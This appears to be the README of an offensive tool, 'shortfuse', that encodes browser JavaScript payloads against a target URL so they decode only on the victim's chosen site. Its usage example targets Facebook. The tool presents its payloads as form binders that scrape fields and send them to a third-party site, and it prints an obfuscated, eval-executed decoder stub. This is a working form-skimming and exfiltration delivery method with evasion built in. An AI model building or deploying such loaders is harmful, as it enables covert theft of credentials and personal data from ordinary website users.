Purpose
=======
Uses rolling modulus encoder (from doomsday) to encode a payload against a URL key. The JS will only decode if the proper site is being visited by the victim browser. On decode, payloads can be injected into the DOM and hook existing page functionality. 

Usage
=====
	python shortfuse.py "https://www.facebook.com" payloads/facebook

Payloads
========
It is assumed this tool would be used within a browser against a single target website. Payloads are simple form binders that scrape fields of interest and send them off to a third-party website.

Example Output
==============
function f() {u = window.location.toString();c = u.charCodeAt(0);c += u.length;var e = 'cCxMshOHB&5{eJ8?xTZ]W=Y0EI8\'*7s#*jO[:5#+b0kQ1sY^dOcW$^M)j8B)+8KW4p/sYw#h$&nTj%TmT;7K8+uMPJXk]>[.`VfK5s,htk{R(2mS*oLR:{&m;E)g>q23v{s Y5O"*6mGm?|-veD6rBL0nExD#2{xS/Iz$0g5r`{h?:7>)9CipR7C"{iqJvS9vWB+3p[DL';H = '';for ( n=0; n<e.length; n++){c = c % 0x5e;v = e.charCodeAt(n) + c;if (v >= 0x7e){v = v-0x5e;}H += String.fromCharCode(v);c += v;}return H;}var S = f();eval(S);
